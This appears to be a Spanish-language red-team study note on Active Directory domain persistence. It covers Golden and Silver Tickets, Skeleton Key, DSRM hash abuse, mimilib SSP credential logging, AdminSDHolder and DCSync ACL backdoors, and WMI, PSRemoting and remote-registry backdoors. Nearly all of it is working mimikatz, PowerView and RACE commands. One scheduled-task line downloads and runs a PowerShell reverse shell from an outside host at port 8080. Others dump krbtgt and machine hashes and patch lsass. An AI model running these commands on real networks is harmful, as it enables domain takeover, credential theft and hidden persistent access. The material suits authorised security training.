# Active Directory Domain Dominance

Hay muchas mas cosas en AD que únicamente obtener administrador de dominio.

**Domain Persistence - Golden Ticket**

- Un Golden Ticket está firmado y cifrado por el hash de krbtgt que lo convierte en un ticket TGT válido.
- Dado que la validación de la cuenta de usuario no se realiza mediante el controlador de dominio (KDC
servicio) hasta que TGT tenga más de 20 minutos, podemos usar incluso
cuentas eliminadas/revocadas/inexistentes.
- El hash de usuario krbtgt podría utilizarse para suplantar a cualquier usuario con
cualquier privilegio incluso de un equipo que no sea de dominio.
- El cambio de contraseña única no tiene ningún efecto en este ataque como contraseña
se mantiene el historial de la cuenta

Ejecutamos mimikatz en el DC para obtener el hash de krbtgt:

`Invoke-Mimikatz -Command '"lsadump::lsa /patch"'`

En una máquina que puede llegar al CONTROLADOR DE DOMINIO a través de la red:

`Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain: /sid: /krbtgt: /startoffset:0 /endin:600 /renewmax:10080 /ptt"'`

Usando SafetyKatz:

`C:\SafetyKatz.exe "lsadump::lsa /patch" "exit"`

En una máquina que puede llegar al CONTROLADOR DE DOMINIO a través de la red(necesita ejecutar como admin):

`C:\BetterSafetyKatz.exe "kerberos::golden 
/User:Administrator /domain: /sid: /krbtgt: /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"`


![images/Active%20Directory%20Domain%20Dominance/Untitled%201.png](images/Active%20Directory%20Domain%20Dominance/Untitled%201.png)

**Domain Persistence - Silver Ticket**

- Un TGS válido (el boleto de oro es TGT).
- Cifrado y firmado por el hash NTLM de la cuenta de servicio (Golden ticket está firmado por hash de krbtgt) del servicio que se ejecuta con esa
cuenta.
- Los servicios rara vez comprueban PAC (Privileged Attribute Certificate).
- Los servicios permitirán el acceso únicamente a los propios servicios.
- Período de persistencia razonable (30 días predeterminados para las cuentas de equipo).

Mediante el hash de la cuenta de equipo del controlador de dominio, a continuación el comando proporciona
acceso a recursos compartidos en el controlador de dominio:

`Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain: /sid: /target: /service:cifs /rc4: /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'`

Se puede utilizar un comando similar para cualquier otro servicio en un equipo. ¿Qué servicios? HOST, RPCSS, WSMAN y muchos más



Hay varias formas de conseguir RCE utilizando Silver Tickets:

Crea un ticket plateado para el SPN HOST que nos permitirá programar una tarea en el target:

`Invoke-Mimikatz -Command '"kerberos::golden 
/User:Administrator /domain: /sid: /target: /service:HOST /rc4: /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 
/ptt"'`

Ejecuta la tarea:

`schtasks /create /S PCNAME /SC Weekly
/RU "NT Authority\SYSTEM" /TN "STCheck" /TR
"powershell.exe -c 'iex (New-Object 
Net.WebClient).DownloadString(''http://IP:8080/Invoke-PowerShellTcp.ps1''')'"`

`schtasks /Run /S PCNAME /TN "STCheck"`

**Domain Persistence - Skeleton Key**

- La llave maestra es una técnica de persistencia donde es posible parchear un controlador de dominio (proceso lsass) para que permita el acceso como cualquier usuario con una sola contraseña.
- Dell Secureworks descubrió el ataque y lo utilizó en un malware llamado
el malware Skeleton Key.
- Todos los métodos conocidos públicamente NO son persistentes en los reinicios.
- Una vez más, mimikatz al rescate.

Utilice el siguiente comando para inyectar una clave maestra (la contraseña sería mimikatz) en un controlador de dominio de su elección. Se requieren privilegios de DA:

`Invoke-Mimikatz -Command '"privilege::debug" 
"misc::skeleton"' -ComputerName us-dc`

Ahora es posible acceder a cualquier maquina con un usuario valido y la contraseña de mimikatz:

`Enter-PSSession –Computername us-dc –credential
us\Administrator`

Puede acceder a otras máquinas, siempre y cuando se autentiquen con el DC que se ha parcheado y el DC no se reinicia.

En caso de que lsass se esté ejecutando como un proceso protegido, todavía podemos usar Skeleton Key pero necesita el controlador mimikatz (mimidriv.sys) en el disco del DC de destino

mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-

Esto puede ser muy ruidoso en los logs.

**Domain Persistence – DSRM**

- DSRM es el modo de restauración de servicios de directorio.
- Hay un administrador local en cada DC llamado "Administrador" cuya contraseña es la contraseña DSRM.
- La contraseña de DSRM (SafeModePassword) se guarda cuando un servidor se promueve a controlador de dominio y rara vez se cambia.
- Después de alterar la configuración en el DC, es posible pasar el hash NTLM de este usuario para acceder al DC.

Dumpear DSRM (necesita DA priv)

`Invoke-Mimikatz -Command '"token::elevate" 
"lsadump::sam"' -Computername us-dc`

Comparar los hashes de administrador:

`Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -
Computername us-dc`

El primero es el DSRM administrador local.

Dado que es el administrador 'local' del DC, podemos pasar el hash para autenticar.

Pero, el comportamiento de inicio de sesión para la cuenta DSRM debe cambiarse antes de que podamos usar su hash

`Enter-PSSession -Computername us-dc`

`New-ItemProperty
"HKLM:\System\CurrentControlSet\Control\Lsa\" -Name
"DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD`

Usamos este comando para hacer un pass the hash:

`Invoke-Mimikatz -Command '"sekurlsa::pth /domain: /user:Administrator /ntlm:/run:powershell.exe"'`

`ls \\us-dc\C$`

Para usar PSRemoting, tenemos que forzar una autenticación NTLM:

`Enter-PSSession -ComputerName us-dc -Authentication
Negotiate`

**Domain Persistence – Custom SSP**

Un proveedor de soporte de seguridad (SSP) es una DLL que proporciona formas para que una aplicación obtenga una conexión autenticada. Algunos paquetes SSP de Microsoft son:

NTLM

Kerberos

Wdigest

CredSSP

Mimikatz proporciona un SSP personalizado: mimilib.dll. Este SSP registra los inicios de sesión locales, la cuenta de servicio y las contraseñas de la cuenta de la máquina en texto sin cifrar en el servidor de destino.

Podemos usar cualquiera de las formas:

Soltamos el mimilib.dll a system32 y añadimos mimilib a HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages:

`$packages = Get-ItemProperty
HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security 
Packages'| select -ExpandProperty 'Security Packages'
$packages += "mimilib"`

`Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages`

`Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name
'Security Packages' -Value $packages`

Usando mimikatz para inyectar a lsass(No funciona en server 2016 y 2019):

`Invoke-Mimikatz -Command '"misc::memssp"'`

**Domain Persistence –Malicious SSP**

Todos los inicios de sesión locales en el DC se registran en: C:\Windows\system32\kiwissp.log

**Domain Persistence using ACLs – AdminSDHolder**

- Reside en el contenedor del sistema de un dominio y se usa para controlar los permisos, usando una ACL, para ciertos grupos privilegiados integrados (llamados grupos protegidos).
- El propagador de descriptores de seguridad (SDPROP) se ejecuta cada hora y compara la ACL de los grupos y miembros protegidos con la ACL de AdminSDHolder y cualquier diferencia se sobrescribe en la ACL del objeto.

![images/Active%20Directory%20Domain%20Dominance/Untitled%204.png](images/Active%20Directory%20Domain%20Dominance/Untitled%204.png)

Abuso bien conocido de algunos de los grupos protegidos: todos los siguientes pueden iniciar sesión localmente en DC

![images/Active%20Directory%20Domain%20Dominance/Untitled%205.png](images/Active%20Directory%20Domain%20Dominance/Untitled%205.png)

- Con privilegios de DA (control total / permisos de escritura) en el objeto AdminSDHolder, se puede usar como mecanismo  puerta trasera / persistencia
agregando un usuario con permisos completos (u otros permisos interesantes) al objeto AdminSDHolder.
- En 60 minutos (cuando se ejecuta SDPROP), el usuario se agregará con Control total al AC de grupos como Administradores de dominio sin ser realmente miembro de él.

Agregue permisos de FullControl para un usuario al AdminSDHolder usando PowerView como DA:

`Add-DomainObjectAcl -TargetIdentity
'CN=AdminSDHolder,CN=System,dc=us,dc=,dc=local' -PrincipalIdentity username -Rights All -PrincipalDomain dominio -TargetDomain dominio -Verbose`

Usando AD modulo y RACE toolkit:

([https://github.com/samratashok/RACE](https://github.com/samratashok/RACE))

`Set-ADACL -DistinguishedName 'DC=us,DC=,DC=local' -SamAccountName user -GUIDRight DCSync -Verbose`

Otros permisos interesantes (ResetPassword, WriteMembers) para un usuario al AdminSDHolder:

`Add-DomainObjectAcl -TargetIdentity
'CN=AdminSDHolder,CN=System,dc=us,dc=,dc=local' -PrincipalIdentity user -Rights ResetPassword -PrincipalDomain domain -TargetDomain domain -Verbose`

`Add-DomainObjectAcl -TargetIdentity
'CN=AdminSDHolder,CN=System,dc=us,dc=,dc=local' -PrincipalIdentity user -Rights WriteMembers -PrincipalDomain domain -TargetDomain domain -Verbose`

Ejecute SDProp manualmente usando Invoke-SDPropagator.ps1 desde el directorio de Herramientas:

`Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose`

Para maquinas pre-Server 2008:

`Invoke-SDPropagator -taskname FixUpInheritance -
timeoutMinutes 1 -showProgress -Verbose`

Verifique el permiso de administradores de dominio - PowerView como usuario normal:

`Get-DomainObjectAcl -Identity 'Domain Admins' -
ResolveGUIDs | ForEach-Object {$_ | Add-Member
NoteProperty 'IdentityName' $(Convert-SidToName
$_.SecurityIdentifier);$_} | ?{$_.IdentityName -match
"User"}`

AD module:

`(Get-Acl -Path 'AD:\CN=Domain 
Admins,CN=Users,DC=us,DC=,DC=local').Access | ?{$_.IdentityReference -match 'user'}`

Abusando de FullControl usando PowerView:

`Add-DomainGroupMember -Identity 'Domain Admins' -Members user -Verbose`

AD module:

`Add-ADGroupMember -Identity 'Domain Admins' -Members user`

Abusando de Reseteo de contraseñas con PowerView:

`Set-DomainUserPassword -Identity user -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose`

AD module:

`Set-ADAccountPassword -Identity testda -NewPassword
(ConvertTo-SecureString "Password@123" -AsPlainText -
Force) -Verbose`

**Persistence using ACLs – Rights Abuse**

- Hay ACL incluso más interesantes de las que se puede abusar.
- Por ejemplo, con privilegios de DA, la ACL de la raíz del dominio se puede modificar para proporcionar derechos útiles como FullControl o la capacidad de ejecutar "DCSync".

Añadir permisos FullControl :

`Add-DomainObjectAcl -TargetIdentity
"dc=us,dc=,dc=local" -PrincipalIdentity
User -Rights All -PrincipalDomain
us.techcorp.local -TargetDomain domain -
Verbose`

Usando AD Module:

`Set-ADACL -SamAccountName user -
DistinguishedName 'DC=us,DC=,DC=local' -Right
GenericAll -Verbose`

Añadiendo derechos para DCSync:

`Add-DomainObjectAcl -TargetIdentity
"dc=us,dc=,dc=local" -PrincipalIdentity
User -Rights DCSync -PrincipalDomain
Domain -TargetDomain domain -
Verbose`

Usando AD Module:

`Set-ADACL -SamAccountName user -
DistinguishedName 'DC=us,DC=,DC=local' -
GUIDRight DCSync -Verbose`

Ejecutamos DCSync:

`Invoke-Mimikatz -Command '"lsadump::dcsync
/user:ops\krbtgt"'`

o tambien con:

`C:\SafetyKatz.exe "lsadump::dcsync
/user:us\krbtgt" "exit"`

**Persistence using ACLs – Security Descriptors**

- Es posible modificar los descriptores de seguridad (información de seguridad como propietario, grupo principal, DACL y SACL) de varios métodos de acceso remoto (objetos protegibles) para permitir el acceso a usuarios que no son administradores.
- Se requieren privilegios administrativos para esto.
- Por supuesto, funciona como un mecanismo de puerta trasera muy útil e impactante.

- El lenguaje de definición de descriptores de seguridad define el formato que se utiliza para describir un descriptor de seguridad. SDDL usa cadenas ACE para DACL y SACL:
ace_type; ace_flags; derechos; object_guid; heredar_object_guid; account_sid
- ACE para administradores integrados para espacios de nombres WMI
A; CI; CCDCLCSWRPWPRCWD ;;; SID

**WMI**

Las ACL se pueden modificar para permitir que los usuarios que no son administradores accedan a objetos protegibles. Uso del kit de herramientas RACE:

`C:\RACE.ps1`

En la maquina local:

`Set-RemoteWMI -SamAccountName user –Verbose`

En una máquina remota para user sin credenciales explícitas:

`Set-RemoteWMI -SamAccountName studentuser1 -ComputerName us-dc -Verbose`

En una máquina remota con credenciales explícitas. Solo root \ cimv2 y espacios de nombres anidados:

`Set-RemoteWMI -SamAccountName user -ComputerName us-dc -
Credential Administrator –namespace 'root\cimv2' -Verbose`

En la máquina remota, elimine los permisos:

`Set-RemoteWMI -SamAccountName user -ComputerName us-dc -Remove`

**PowerShell Remoting**

Uso del kit de herramientas RACE: la puerta trasera de PS Remoting no es estable después de los parches de agosto de 2020

En la maquina local de estudiante:

`Set-RemotePSRemoting -SamAccountName user –Verbose`

En una máquina remota para user sin credenciales explícitas:

`Set-RemotePSRemoting -SamAccountName user -ComputerName us-dc -Verbose`

En la máquina remota, elimine los permisos:

`Set-RemotePSRemoting -SamAccountName user -ComputerName us-dc -Remove`

**Remote Registry**

Uso del kit de herramientas RACE, con admin priv en la maquina remota:

`Add-RemoteRegBackdoor -ComputerName us-dc -Trustee user -Verbose`

Como user, recupere el hash de la cuenta de la máquina:

`Get-RemoteMachineAccountHash -ComputerName us-dc -Verbose`

Recuperar el hash de la cuenta local:

`Get-RemoteLocalAccountHash -ComputerName us-dc -Verbose`

Recuperar las credenciales almacenadas en caché del dominio:

`Get-RemoteCachedCredential -ComputerName us-dc -Verbose`
